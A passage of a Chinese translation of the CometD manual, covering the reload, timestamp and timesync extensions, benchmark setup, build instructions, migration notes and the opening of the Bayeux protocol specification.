上面的例子在使用jQuery的require（）语法时也是有效的。

jquery.cometd-binary.js文件为jQuery提供了客户端扩展绑定。 如果不使用require（）语法，则必须通过script标记将实现文件和jQuery扩展绑定包含在HTML页面中：

	<script type="text/javascript" src="BinaryExtension.js"></script>
	<script type="text/javascript" src="jquery.cometd-timestamp.js"></script>

在Dojo和jQuery扩展绑定中，扩展名以“binary”名称注册在默认的cometd对象中。

对于Java客户端，您必须将扩展添加到BayeuxClient实例中：

	BayeuxClient bayeuxClient = ...;
	bayeuxClient.addExtension(new org.cometd.client.ext.BinaryExtension());

10.7.重新加载扩展
-----------------
重新加载扩展允许CometD加载或重新加载页面，而不必在新的（或重新加载的）页面中重新握手，从而恢复现有的CometD连接。 该扩展只需要客户端扩展。

###10.7.1. 启用客户端扩展
dojox / cometd / reload.js为Dojo提供客户端扩展绑定，并且使用Dojo的dojo.require机制就足够了：

	require(["dojox/cometd", "dojox/cometd/reload"], function(cometd) {
	    ...
	});

上面的例子在使用jQuery的require（）语法时也是有效的。

jquery.cometd-reload.js文件为jQuery提供了客户端扩展绑定。 如果不使用require（）语法，则必须通过script标记在HTML页面中包含jQuery cookie插件，实现文件和jQuery扩展绑定：
	
	<script type="text/javascript" src="jquery.cookie.js"></script>
	<script type="text/javascript" src="ReloadExtension.js"></script>
	<script type="text/javascript" src="jquery.cometd-reload.js"></script>

在Dojo和jQuery扩展绑定中，扩展名都以名称“reload”的形式在默认的cometd对象上注册。

###10.7.2. 配置重新加载扩展
重新加载扩展接受以下配置参数：

| 变量名         |默认值    |变量描述
| --------   | :----: |:----: 
| name        |  org.cometd.reload     |重新加载扩展用来保存连接状态详细信息的密钥的名称。

JavaScript cometd对象通常已经配置了默认的重载扩展配置。

重新加载扩展对象可以重新配置，但通常不需要这样做。 要重新配置重新加载扩展：



- 在启动时重新配置扩展：

	var cometd = dojox.cometd; // Use $.cometd if using jquery
	cometd.getExtension('reload').configure({
	    name: 'com.acme.Company.reload'
	});



- 在调用cometd.reload（）函数时重新配置扩展：
	
	var cometd = dojox.cometd; // Use $.cometd if using jquery
	...
	cometd.reload({
	    name: 'com.acme.Company.reload'
	});

###10.7.3.了解重新加载扩展详细信息
重新加载扩展对于允许用户重新加载CometD页面或者导航到其他CometD页面而不经过断开连接和握手周期是有用的，因此在重新加载或在新页面上恢复现有的CometD会话。

当重新加载或导航离开页面时，浏览器将销毁与该页面关联的JavaScript上下文，并中断与服务器的连接。在重新加载或新页面上，JavaScript上下文由浏览器重新创建，但CometD JavaScript库已经丢失了上一页中建立的所有CometD会话详细信息。如果没有重新加载扩展，应用程序需要通过另一个握手步骤重新创建所需的CometD会话详细信息。

重新加载扩展使得能够通过重新建立先前成功的CometD会话来在新页面中恢复CometD会话。这非常有用，特别是当服务器为CometD会话建立一个有状态的上下文时，不会因为用户刷新页面或导航到同一个CometD Web应用程序的另一部分而丢失。这种有状态上下文的一个典型例子是服务器需要保证消息传递的时候（参见确认扩展部分）。在这种情况下，服务器具有尚未被客户端确认的消息列表，如果客户端重新加载页面，而没有重新加载扩展，则该消息列表将丢失，导致客户端可能丢失重要消息。通过重新加载扩展，相反，CometD会话将恢复，并且它将显示给服务器，就像它从未中断一样，从而允许服务器向客户端传递未确认的消息。

重载扩展以这种方式工作：在页面加载时，应用程序配置CometD对象，注册通道侦听器并最终调用cometd.handshake（）。这个握手通常会联系服务器并建立一个新的CometD会话，并且重新加载扩展跟踪这个成功的握手。在页面重新加载时，或页面导航到另一个CometD页面时，应用程序代码必须调用cometd.reload（）（例如，在页面卸载事件处理程序上，请参阅下面的注释）。当调用cometd.reload（）时，重载扩展会将CometD会话状态详细信息以配置指定的名称保存在SessionStorage中。

当新页面加载时，它将执行在首页加载时执行的相同代码，即配置CometD的代码，注册的通道侦听器，并最终调用cometd.handshake（）。重新加载扩展在新的握手时被调用，将找到保存在SessionStorage中的CometD会话状态，并使用从SessionStorage检索到的信息重新建立CometD会话。

>注意
>>函数cometd.reload（）应该从页面卸载事件处理程序中调用。

>>多年来，浏览器，平台和规范都试图清楚地了解什么操作会触发卸载事件，以及是否为单个用户操作触发了不同的事件，如关闭浏览器窗口，点击浏览器后退按钮或点击在一个链接上。

>>作为一个经验法则，函数cometd.reload（）应该从允许写入SessionStorage的事件处理程序中调用。

>>通常，window.onbeforeunload事件是调用cometd.reload（）的好地方，但是历史上window.onunload事件在大多数浏览器/平台组合中都起作用。最近，window.onpagehide事件被定义（尽管语义略有不同），并且也应该起作用。

>>应用程序应该开始将cometd.reload（）调用绑定到window.onbeforeunload事件，然后测试/实验如果这是正确的事件。您应该验证您的用例，浏览器/平台组合，可能触发事件的操作（例如：下载链接，javascript：链接等）的行为。

>>不幸的是，关于卸载事件的困惑尚未完全清除，所以建议您在各种条件下非常小心地测试此功能。

一个简单的例子如下：

	<html>
	    <head>
	        <script type="text/javascript" src="dojo.js"></script>
	        <script type="text/javascript">
	            require(["dojo", "dojo/on", "dojox/cometd", "dojox/cometd/reload", "dojo/domReady!"],
	            function(dojo, on, cometd) {
	                cometd.configure({ url: "http://localhost:8080/context/cometd", logLevel: "info" });
	
	                // Always subscribe to channels from successful handshake listeners.
	                cometd.addListener("/meta/handshake", new function(m) {
	                    if (m.successful) {
	                        cometd.subscribe("/some/channel", function() { ... });
	                        cometd.subscribe("/some/other/channel", function() { ... });
	                    }
	                });
	
	            // Upon the unload event, call cometd.reload().
	            on(window, "beforeunload", cometd.reload);
	
	            // Finally, handshake.
	            cometd.handshake();
	        </script>
	    </head>
	    <body>
	    ...
	    </body>
	</html>

10.8.时间戳扩展
---------------
时间戳扩展为客户端和/或服务器发送的每条消息向消息对象添加一个时间戳。 这是一个非标准扩展，因为它不会将附加字段添加到ext字段，而是添加到消息对象本身。 此扩展需要客户端扩展和服务器端扩展。 Java中提供了服务器端扩展。

###10.8.1. 启用服务器端扩展
要启用对时间戳消息的支持，您必须在初始化期间将扩展添加到org.cometd.bayeux.server.BayeuxServer实例：

	bayeuxServer.addExtension(new org.cometd.server.ext.TimestampExtension());

###10.8.2.启用客户端扩展
dojox / cometd / timestamp.js为Dojo提供客户端扩展绑定，并且使用Dojo的dojo.require机制就足够了：

	require(["dojox/cometd", "dojox/cometd/timestamp"], function(cometd) {
	    ...
	});

上面的例子在使用jQuery的require（）语法时也是有效的。

jquery.cometd-timestamp.js文件为jQuery提供了客户端扩展绑定。 如果不使用require（）语法，则必须通过script标记将实现文件和jQuery扩展绑定包含在HTML页面中：

	<script type="text/javascript" src="TimeStampExtension.js"></script>
	<script type="text/javascript" src="jquery.cometd-timestamp.js"></script>

在Dojo和jQuery扩展绑定中，扩展名以“timestamp”名称注册在默认的cometd对象上。

10.9.Timesync扩展
-----------------
timesync扩展使用客户端和服务器之间交换的消息来计算客户端时钟和服务器时钟之间的偏移量。 这与时间戳扩展部分无关，该部分为所有时间戳使用本地时钟。 此扩展需要客户端扩展和服务器端扩展。 Java中提供了服务器端扩展。

###10.9.1. 启用服务器端扩展
要启用对时间同步的支持，您必须在初始化期间将扩展添加到org.cometd.bayeux.server.BayeuxServer实例中：

	bayeuxServer.addExtension(new org.cometd.server.ext.TimesyncExtension());

###10.9.2.启用客户端扩展
dojox / cometd / timesync.js为Dojo提供客户端扩展绑定，并且使用Dojo的dojo.require机制就足够了：

	require(["dojox/cometd", "dojox/cometd/timesync"], function(cometd) {
	    ...
	});

上面的例子在使用jQuery的require（）语法时也是有效的。

文件jquery.cometd-timesync.js为jQuery提供了客户端扩展绑定。 如果不使用require（）语法，则必须通过script标记将实现文件和jQuery扩展绑定包含在HTML页面中：
	
	<script type="text/javascript" src="TimeSyncExtension.js"></script>
	<script type="text/javascript" src="jquery.cometd-timesync.js"></script>

在Dojo和jQuery扩展绑定中，扩展名都以“timesync”名称注册在默认的cometd对象中。

###10.9.3.了解Timesync扩展详细信息
时间同步扩展允许客户端和服务器在每次握手和连接消息之间交换时间信息，以便客户端可以计算从其自己的时钟周期到服务器周期的大致偏移量。 所使用的算法与NTP算法非常相似。

每次握手或连接时，分机都会在分机字段中发送时间戳，例如：

	{ext:{timesync:{tc:12345567890,l:23,o:4567},...},...}




- tc是自1970年以来邮件发送时的客户端时间戳，以ms为单位



- l是客户计算的网络延迟



- o是客户计算出的时钟偏移量

您可以使用tc-now-l-o来计算偏移和滞后的精度，如果计算出的偏移和滞后非常准确，应该为零。 支持时间同步的Bayeux服务器只有在测量精度值大于精度目标值时才会响应。

响应是一个分机字段，例如：

	{ext:{timesync:{tc:12345567890,ts:1234567900,p:123,a:3},...},...}



- tc是消息发送时的客户端时间戳



- ts是收到消息时的服务器时间戳



- p是以毫秒为单位的轮询持续时间 - 即服务器在发送响应之前所花费的时间





- a是客户发送的计算出的偏移和滞后的测量精度

收到响应后，客户可以使用当前时间来确定总行程时间，从中减去p以确定近似的双向网络遍历时间。 从而：



- lag =（now-tc-p）/ 2



- offset = ts-tc-lag

为了平滑任何瞬态波动，扩展保持接收到的偏移的滑动平均值。 默认情况下，这是超过十条消息，但您可以通过在创建扩展期间传递一个配置对象来更改此值：

	// Unregister the default timesync extension
	cometd.unregisterExtension('timesync');
	
	// Re-register with different configuration
	cometd.registerExtension('timesync', new org.cometd.TimeSyncExtension({ maxSamples: 20 }));

客户端时间同步扩展还公开了几个函数来处理时间同步的结果：



- getNetworkLag（） - 获取计算出的客户端和服务器之间的网络延迟



- getTimeOffset（） - 以毫秒为单位获得客户端时钟和服务器时钟之间的偏移量



- getServerTime（） - 获取服务器的时间



- setTimeout（） - 用于安排在某个服务器时间执行的功能


11.CometD 基准
=============
CometD项目带有一个负载测试工具，可用于基准CometD如何扩展。

建议从开箱即用的CometD基准开始。 如果您想为您的特定需求编写自己的基准测试，请从CometD基准测试代码开始，研究并根据需要对其进行修改，而不是从头开始。

CometD基准经过了多年的仔细调整和调整，以避免常见的基准误差，并使用可用的最佳工具产生有意义的结果。 CometD基准测试模块的任何改进都是值得欢迎的：基准测试不断发展，因此基准测试代码始终得到改进。

>注意
>>与任何基准测试一样，您的里程可能会有所不同，虽然基准测试可能会为您提供关于CometD如何在基础架构上扩展的良好信息，但很可能在部署生产时，应用程序的行为会有所不同，因为远程用户，网络基础架构， TCP堆栈设置，操作系统设置，JVM设置，应用程序设置等与您所测试的不同。

11.1.基准设置
------------
负载测试对操作系统，TCP堆栈和网络可能非常紧张，因此您可能需要调整一些值以避免操作系统，TCP堆栈或网络成为瓶颈，使您认为CometD无法扩展。 CometD确实可以扩展。该设置必须在客户端和服务器主机上完成。

建议的Linux配置如下，如果您不使用Linux，则应该尝试将其与其他操作系统进行匹配。

调整最重要的参数是打开文件的数量。这是默认情况下的一个小数字，如1024，并且必须增加，例如：

＃ulimit -n 65536
您可以通过修改/etc/security/limits.conf来使此设置在重新启动时保持不变。

您可能想要调整的另一个设置，特别是在客户端主机中，是应用程序可以使用的临时端口范围。如果这个范围太小，它将限制基准能够从客户端主机建立的CometD会话的数量。一个典型的范围是32768-61000，它提供了大约28k的临时端口，但是您可能需要增加它以获得非常大的基准：

＃sysctl -w net.ipv4.ip_local_port_range =“2000 64000”
和以前一样，您可以通过修改/etc/security/limits.conf使该设置在重新启动时保持不变。

您可能希望在客户端和服务器主机中调整的另一个重要参数是线程池的最大线程数。该参数称为最大线程数，默认为256，对于大量客户端的基准测试可能太小。

运行服务器和客户端时，可以配置最大线程参数。

您希望调整的另一个重要参数（特别是对于具有大量用户的基准）是JVM最大堆大小。对于客户端JVM和服务器JVM，默认情况下这是2 GiB，但通过修改基准客户端模块目录中的pom.xml文件中存在的JVM启动选项（$ COMETD / cometd-java / cometd -java-benchmark / cometd-java-benchmark-client / pom.xml）以及基准服务器模块目录（$ COMETD / cometd-java / cometd-java-benchmark / cometd-java-benchmark-server / pom.xml） ，分别为客户端和服务器。

一个客户端主机和一个服务器主机（可能是同一主机）的典型配置适用于少数用户，比如小于5000，可能是：

最大打开文件 - > 65536
本地端口范围 - > 32768-61000（默认;仅在客户端主机上）
最大线程数 - > 256（默认）
最大堆大小 - > 2 GiB（默认）
大量用户的典型配置，例如10k或更多，可以是：

最大打开文件 - > 1048576
本地端口范围 - > 2000-64000（仅限客户端主机）
最大线程数 - > 2048
最大堆大小 - > 8 GiB
上面的值仅仅是一个例子，让你意识到它们严重影响了基准测试结果。您必须根据您的基准目标，操作系统和硬件尝试自己并调整这些参数。

11.2.运行基准
-------------
该基准包含一个真实的聊天应用程序，并模拟远程用户向聊天室发送消息。消息被广播给所有会员。

该基准强调CometD的一个核心特征，即从远程用户接收一条消息然后将该消息扇出给所有房间成员的能力。

基准客户端将测量所有房间成员的消息等待时间，即每个房间成员获取原始用户发送的消息所需的时间。

然后以ASCII图形的形式显示延迟，以及关于基准运行的其他有趣信息。

###11.2.1.运行服务器
基准服务器从$ COMETD / cometd-java / cometd-java-benchmark / cometd-java-benchmark-server /目录运行。

可以修改该目录中的pom.xml文件以配置要使用的java可执行文件，以及命令行JVM参数，特别是要使用的最大堆大小以及要使用的GC算法（以及您可能要添加的其他文件）。

一旦您对在pom.xml文件中指定的JVM配置感到满意，您可以在终端窗口中运行基准测试服务器：

	$ cd $COMETD/cometd-java/cometd-java-benchmark/cometd-java-benchmark-server/
	$ mvn exec:exec

基准测试会提示您输入许多配置参数，例如侦听的TCP端口，最大线程池大小等。

典型的输出是：

	listen port [8080]:
	use ssl [false]:
	selectors [8]:
	max threads [256]:
	2015-05-18 11:01:13,529 main [ INFO][util.log] Logging initialized @112655ms
	transports (jsrws,jettyws,http,asynchttp) [jsrws,http]:
	record statistics [true]:
	record latencies [true]:
	detect long requests [false]:
	2015-05-18 11:01:17,521 main [ INFO][server.Server] jetty-9.2.10.v20150310
	2015-05-18 11:01:17,868 main [ INFO][handler.ContextHandler] Started o.e.j.s.ServletContextHandler@37374a5e{/cometd,null,AVAILABLE}
	2015-05-18 11:01:17,882 main [ INFO][server.ServerConnector] Started ServerConnector@5ebec15{HTTP/1.1}{0.0.0.0:8080}
	2015-05-18 11:01:17,882 main [ INFO][server.Server] Started @117011ms

要退出基准服务器，只需在终端窗口中按ctrl + c。

###11.2.2.运行客户端
基准测试客户端可以与基准测试服务器在同一台主机上运行，但建议在不同的主机上运行它，或者在许多不同的主机上运行它，而不是服务器。

基准客户端从$ COMETD / cometd-java / cometd-java-benchmark / cometd-java-benchmark-client /目录运行。

可以修改该目录中的pom.xml文件以配置要使用的java可执行文件，以及命令行JVM参数，特别是要使用的最大堆大小以及要使用的GC算法（以及您可能要添加的其他文件）。

一旦您对pom.xml文件中指定的JVM配置感到满意，您可以在终端窗口中运行基准测试客户端：
	
	$ cd $COMETD/cometd-java/cometd-java-benchmark/cometd-java-benchmark-client/
	$ mvn exec:exec

基准测试会提示您输入许多配置参数，例如要连接的主机，要连接的TCP端口，最大线程池大小等。

典型的输出是：

	server [localhost]:
	port [8080]:
	transports:
	  0 - long-polling
	  1 - jsr-websocket
	  2 - jetty-websocket
	transport [0]:
	use ssl [false]:
	max threads [256]:
	context [/cometd]:
	channel [/chat/demo]:
	rooms [100]:
	rooms per client [10]:
	enable ack extension [false]:
	2015-05-18 11:10:08,180 main [ INFO][util.log] Logging initialized @6095ms
	
	clients [1000]:
	Waiting for clients to be ready...
	Waiting for clients 998/1000
	Clients ready: 1000
	batch count [1000]:
	batch size [10]:
	batch pause (µs) [10000]:
	message size [50]:
	randomize sends [false]:

默认配置会创建100个聊天室，每个用户都是随机选择的10个会员室。

缺省配置将1000个用户连接到localhost：8080的服务器，并发送1000批次的每个10个消息，每个消息的大小为50个字节。

基准测试运行完成后，将显示消息等待时间图：


	Outgoing: Elapsed = 12760 ms | Rate = 783 messages/s - 78 requests/s - ~0.299 Mib/s
	Waiting for messages to arrive 998910/999669
	All messages arrived 999669/999669
	Messages - Success/Expected = 999669/999669
	Incoming - Elapsed = 12781 ms | Rate = 78211 messages/s - 33690 responses/s(43.08%) - ~29.835 Mib/s
	                 @    _  14,639 µs (323157, 32.33%)
	                   @  _  29,278 µs (389645, 38.98%) ^50%
	       @              _  43,917 µs (135915, 13.60%)
	   @                  _  58,556 µs (55470, 5.55%) ^85%
	  @                   _  73,195 µs (29921, 2.99%)
	 @                    _  87,834 µs (17204, 1.72%) ^95%
	 @                    _  102,473 µs (11824, 1.18%)
	 @                    _  117,112 µs (11505, 1.15%)
	@                     _  131,751 µs (8812, 0.88%)
	@                     _  146,390 µs (5557, 0.56%)
	@                     _  161,029 µs (2941, 0.29%) ^99%
	@                     _  175,668 µs (2074, 0.21%)
	@                     _  190,307 µs (2975, 0.30%)
	@                     _  204,946 µs (1641, 0.16%)
	@                     _  219,585 µs (693, 0.07%) ^99.9%
	@                     _  234,224 µs (283, 0.03%)
	@                     _  248,863 µs (33, 0.00%)
	@                     _  263,502 µs (11, 0.00%)
	@                     _  278,141 µs (3, 0.00%)
	@                     _  292,780 µs (0, 0.00%)
	@                     _  307,419 µs (5, 0.00%)
	Messages - Latency: 999669 samples | min/avg/50th%/99th%/max = 296/28,208/19,906/149,946/293,076 µs

在上面的示例中，基准客户端每10ms以1个批量的标称速率向服务器发送消息（因此标称速率为1000个消息/秒），但实际输出速率为783个消息/秒在第一行。

因为有100个房间，并且每个用户订购了10个房间，所以每个房间平均有100个成员，因此每个消息被广播给约100个其他用户。这产生了100000条消息/秒的传入标称消息速率，但实际传入速率为78211条消息/秒（与传出速率相当），中位延迟为20毫秒，最大延迟为293毫秒。

ASCII图表示消息延迟分布。设想将等待时间分布图逆时针旋转90度。然后你会看到一个钟形曲线（强烈向左移动），峰值在29毫秒左右，长尾朝向300毫秒。

对于每个时间间隔，曲线报告收到的消息数量及其在总数（括号内）和各种百分位数下降的百分比。

要正常退出基准测试客户端，只需为用户数输入0即可。

###11.2.3.运行多个客户端

如果要使用多台客户端主机运行CometD基准测试，则需要在每个基准测试客户端上调整少数参数。

回想一下，基准模拟一个聊天应用程序，并且消息延迟时间记录在同一个客户端主机上。

由于基准客户端等待所有消息到达以测量其延迟，因此接收消息的每个用户都必须与发送消息的用户位于同一主机上。

每个基准测试客户端定义了多个房间（默认为100个）和发送消息的根通道（默认情况下为/ chat / demo）。到第一个房间room0的消息转到频道/聊天/演示/ 0等等。

在使用多个基准测试客户端主机时，您必须为每个基准测试客户端主机指定不同的根通道，以避免基准测试客户端主机等待因传递到其他基准测试客户端主机而无法到达的消息。此外，将一台主机中生成的时间戳与另一台主机中获取的时间戳关联起来非常困难。因此，建议的配置是为每个基准测试客户端指定一个不同的根通道，以便每个主机的用户只会收发来自同一主机上的用户的消息。

附录A：建设
==========

要求
----

建设CometD项目有两个最低要求：



- JDK 7或更高版本来编译Java代码



- Maven 3或更高版本，构建工具

确保mvn可执行文件位于您的路径中，并且您的JAVA_HOME环境变量指向安装Java的目录。

获取源代码
---------

您可以从配置tarball或通过检查GitHub存储库中的源代码来获取源代码。

如果您想使用分发tarball，请从这里下载，然后使用以下命令将其解压缩：

	$ tar zxvf cometd- <version> -distribution.tar.gz
	$ cd cometd- <version>

如果您想使用最新的代码，请使用以下命令克隆GitHub存储库：

	$ git clone git：//github.com/cometd/cometd.git cometd
	$ cd cometd

执行构建
-------

获得源代码后，您需要发出以下命令来构建它：

	$ mvn clean install

如果您想节省一些时间，可以使用以下命令跳过测试套件的执行：

	$ mvn clean install -DskipTests = true

如果您想用不同的Jetty版本构建CometD，请发出以下命令：

	$ mvn clean install -Djetty-version = <alternate-jetty-version>

例如：

	$ mvn clean install -Djetty-version = 9.3.10.v20160621 -DskipTests = true


尝试你的构建
-----------

要尝试你的构建，只需按照以下步骤完成构建（按照上面的说明构建之后）：

	$ cd cometd-demo
	$ mvn jetty:run

然后将浏览器指向http：// localhost：8080，您应该可以看到CometD Demo页面。

如果您想使用不同的Jetty版本试用您的版本，请将上面的最后一个命令替换为：

	$ mvn jetty：run -Djetty-version = <alternate-jetty-version>

附录B：移民指南
=============

###从CometD 2迁移

所需的JDK版本更改
---------------

| CometD 2	        | CometD 3	    |
| --------   | -----:   |
| JDK 5| JDK 7   |

Servlet规范更改
---------------


| CometD 2	        | CometD 3	    |
| --------   | -----:   |
| Servlet2.5| Servlet 3.0（推荐使用JSR 356的javax.websocket支持的Servlet 3.1）  |

类名称更改
---------

包名称没有改变。


| CometD 2	        | CometD 3	    |
| --------   | -----:   |
| CometdServlet| CometDServlet   |
| AnnotationCometdServlet| AnnotationCometDServlet  |

>注意
>>注意CometD的大写字母'D'

Maven工件更改
------------

只有WebSocket工件已更改。

| CometD 2	        | CometD 3	    |
| --------   | -----:   |
| org.cometd.java:cometd-websocket-jetty| org.cometd.java:cometd-java-websocket-javax-server (JSR 356 WebSocket Server)   |
| org.cometd.java:cometd-java-websocket-jetty-server (Jetty WebSocket Server)| org.cometd.java:cometd-java-websocket-javax-client (JSR 356 WebSocket Client) |

web.xml更改
-------------

CometD 2

	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
	         version="2.5">
	    ...
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometdServlet</servlet-class>
	    </servlet>
	    ...
	</web-app>

CometD 3

	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" 
			 1
	         version="3.0"> 2
	    ...
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <load-on-startup>1</load-on-startup> 3
	        <async-supported>true</async-supported> 4
	    </servlet>
	</web-app>

1. schemaLocation属性从2.5更改为3.0（或更改为3.1）
2. 版本属性从2.5更改为3.0（或更改为3.1）
3. 现在需要load-on-startup元素
4. 需要异步支持的元素

>注意
>>现在需要load-on-startup元素才能使用websocket传输，除非使用Spring来配置BayeuxServer对象（请参阅本节）。 如果未指定load-on-startup，则第一个请求将延迟启动CometD Servlet，该Servlet将启动BayeuxServer对象，该对象将配置websocket传输，但此时，websocket传输处理请求已为时过晚 ，这将由下一个运输工具处理（通常是长轮询运输）。


CometD Servlet参数更改
---------------------

| CometD 2	        | CometD 3	    |记录|
| --------   | -----:   |-----:   |
| 日志级别|  |CometD 3中已删除该参数。在CometD 3中，日志级别由日志框架实现（例如Log4J）控制。|
| 传输| 传输 |该参数改变了它的含义。在CometD 2中，它是一个逗号分隔的附加服务器传输类名称列表。  在CometD 3中，它是以逗号分隔的服务器传输列表。例如，在CometD 3 transports =“org.cometd.websocket.server.JettyWebSocketTransport”中只定义了一个服务器传输：基于Jetty WebSocket API的websocket服务器传输。|
| | ws.cometdURLMapping |WebSocket服务器传输的新的必需参数。它是由CometD Servlet的servlet映射定义的url-pattern字符串的逗号分隔列表，例如/ cometd / *。|

从CometD 3.0迁移到CometD 3.1
----------------------------
从CometD 3.0.x到CometD 3.1.x的移植应该非常简单，大部分时间只需更新CometD版本，而不需要对应用程序或配置做进一步的修改。

您可以在下面找到CometD 3.1.x中引入更改的详细列表。

API行为更改
----------
握手操作现在会抛出一个异常，如果多次执行而不显式断开连接。

握手应该只执行一次，应用程序应该通过使用一次诸如DOMContentLoaded的事件或通过用布尔字段守护握手来强制执行此操作。有关更多信息，请参阅JavaScript握手部分或Java客户端握手部分。

二进制数据
----------
CometD现在允许用二进制数据发送/接收消息，参见二进制数据部分。

消息处理订单更改
--------------
传入消息的处理略有改变，仅影响自定义扩展的编写者（BayeuxServer.Extension或ServerSession.Extension的实现）。

之前的行为是在调用ServerChannel.MessageListener侦听器之前为广播消息和服务消息调用BayeuxServer.Extension.send（...）和ServerSession.Extension.send（...）。

CometD 3.1.x的行为是在调用ServerChannel.MessageListener侦听器之后仅针对广播消息调用BayeuxServer.Extension.send（...）和ServerSession.Extension.send（...）。

HTTP / 2支持
------------
CometD应用程序通常独立于用于发送或接收消息的传输。

但是，如果传输为HTTP / 2，则可以将CometD配置为通过删除未完成长轮询数的限制来利用HTTP / 2传输，请参阅下面的http2MaxSessionsPerBrowser参数。

在多个浏览器选项卡中打开的CometD应用程序之前，只有一个选项卡执行长轮询（并且所有其他选项卡执行普通轮询），现在使用HTTP / 2，可以删除此限制并使所有选项卡执行长整型轮询。

CometD Servlet参数更改
---------------------

| CometD 3.0.x	        |	CometD 3.1.x	    |记录|
| --------   | -----:   |-----:   |
| 允许多会话无浏览器|  |已删除|
| | 最大处理量 |已添加，请参阅服务器配置部分|
| | 每个浏览器的http2最大会话数 |已添加，请参阅服务器配置部分|
| | ws.enableExtension.<extension_name> |已添加，请参阅服务器配置部分|


CometD API补充
--------------

- org.cometd.bayeux.BinaryData，以支持二进制数据。
 
- boolean BayeuxServer.removeSession（ServerSession会话）

- void ClientSession.remoteCall（String target，Object data，MessageListener callback）

JavaScript实现更改
-----------------
JavaScript实现现在支持两种以上的绑定，即Angular 1（Angular 2还不支持）和vanilla JavaScript（即没有框架或其他库的普通JavaScript）。

JavaScript实现现在可以通过NPM和Bower获得，并且与CommonJS模块和AMD模块兼容。

显式引用时，JavaScript文件的位置已更改。 对于使用覆盖WAR构建Maven的应用程序，JavaScript文件位置已更改：

CometD 3.0.x

	org/
	  cometd.js
	  cometd/
	    AckExtension.js
	    ReloadExtension.js
	    TimeStampExtension.js
	    TimeSyncExtension.js

CometD 3.1.x

	js/
	  cometd/
	    cometd.js
	    AckExtension.js
	    BinaryExtension.js
	    ReloadExtension.js
	    TimeStampExtension.js
	    TimeSyncExtension.js

应用程序应相应更改：

CometD 3.0.x	
	
	index.html

		<!-- CometD 3.0.x with WAR overlays. -->
		<script type="text/javascript" 
		src="org/cometd.js"></script>

	application.js

		/// CometD 3.0.x with AMD.
		require({
		        baseUrl: 'js/jquery',
		        paths: {
		            jquery: 'jquery-2.2.4',
		            org: '../org'
		        }
		    },
		    ['jquery','jquery.cometd'],
		    function($, cometd) {
		        ...
		    });

CometD 3.1.x

	index.html

		<!-- CometD 3.1.x with WAR overlays. -->
		<script type="text/javascript" 
		src="js/cometd/cometd.js"></script>

	application.js

		/// CometD 3.1.x with AMD.
		require({
		        baseUrl: "js/jquery",
		        paths: {
		            jquery: "jquery-3.3.1",
		            cometd: "../cometd"
		        }
		    },
		    ['jquery','jquery.cometd'],
		    function($, cometd) {
		        ...
		    });

重新加载扩展已被重写为使用SessionStorage，而不是使用短暂的Cookie。

有两个新的API可用于简化使用二进制数据发送消息：

- cometd.publishBinary（频道，数据，最后，元，回调）

- cometd.remoteCallBinary（目标，数据，最后，元，超时，回调）

Jetty WebSocket服务器传输要求
---------------------------
需要使用Jetty WebSocket服务器传输的服务器端应用程序现在需要使用Jetty版本：

- 9.2.20.v20161216或更高版本在9.2.x系列（需要JDK 7）

- 9.3.x系列中的9.3.15.v20161220或更高版本（需要JDK 8）

- 9.4.x.系列中的9.4.0.v20161208或更高版本（需要JDK 8）

使用默认JSR 356传输的应用程序或不使用WebSocket的应用程序可以与任何Jetty版本一起使用。


附录C：巴约协议规范1.0
=====================
亚历克斯罗素; 格雷格威尔金斯; 大卫戴维斯; 马克内斯比特

©2007 The Dojo Foundation

本文档的状态
-----------

该文件为互联网社区指定了一个协议，并要求讨论和改进建议。本文档以IETF RFC的风格和精神撰写，但目前还没有正式的IETF RFC。这份文件的分发是无限的。

抽象
----

Bayeux是一种用于在Web服务器和Web客户端之间传输异步消息（主要通过HTTP和WebSocket等Web协议）的协议。

介绍
----

目的
----

Bayeux的主要目的是支持Web客户端（例如使用AJAX）和Web服务器之间的响应双向交互。

Bayeux是一种用于传输异步消息（主要通过HTTP）的协议，在Web服务器和Web客户端之间具有低延迟。这些消息通过指定的渠道进行路由并可以交付：

- 服务器到客户端

- 客户端到服务器

- 客户端到客户端（通过服务器）

默认情况下，发布/订阅路由语义应用于频道。

异步消息从服务器传递到Web客户端通常被描述为服务器推送。服务器推送技术与AJAX Web应用程序的组合称为Comet。 CometD是Dojo基金会的一个项目，以多种编程语言提供多种Bayeux协议的实现。

Bayeux寻求通过允许实施者更容易地互操作，解决常见的消息分发和路由问题以及提供增量改进和扩展的机制来降低开发Comet web应用的复杂性。

要求
----

本文件中的“必须”，“不得”，“需要”，“应”，“不应”，“应该”，“不应该”，“推荐”，“可能”和“可选”按照RFC2119中的描述进行解释。如果实现不符合其实现的协议中的一个或多个必须满足的要求级别要求，则实现不符合要求。据说满足所有MUST或REQUIRED级别以及其协议的所有SHOULD级别要求的实现被称为“无条件符合”;一个满足所有MUST级别的要求，但不是所有协议的SHOULD级别要求都被认为是“有条件的”。

术语
----

本规范使用许多术语来指代参与者和Bayeux通信对象所扮演的角色：

####客户


一个启动通信的程序。

####服务器


接受来自客户的通信的应用程序。 Web服务器接受TCP / IP连接，以便通过发回Web响应来为Web请求（HTTP请求或WebSocket请求）提供服务。 Bayeux服务器接受并响应由Bayeux客户端发起的消息交换。

####请求

对于HTTP协议，RFC 2616第5部分定义的HTTP请求消息。

####响应

对于HTTP协议，RFC 2616第6节定义的HTTP响应消息。

####信息

消息是在客户端和服务器之间交换的JSON编码对象，用于实现由消息字段部分，元消息部分和事件消息部分定义的Bayeux协议。

####事件

通过Bayeux协议发送的特定于应用程序的数据。

####信封

包装标准Bayeux消息的传输特定消息格式。

####渠道

指定的目标和/或事件源。事件发布到频道，订阅者可以接收发布的事件。

####连接

用于消息交换目的的永久或暂时建立的通信链路。如果与服务器建立了一个链接，客户端即可连接，通过该链接可以接收异步事件。

####JSON
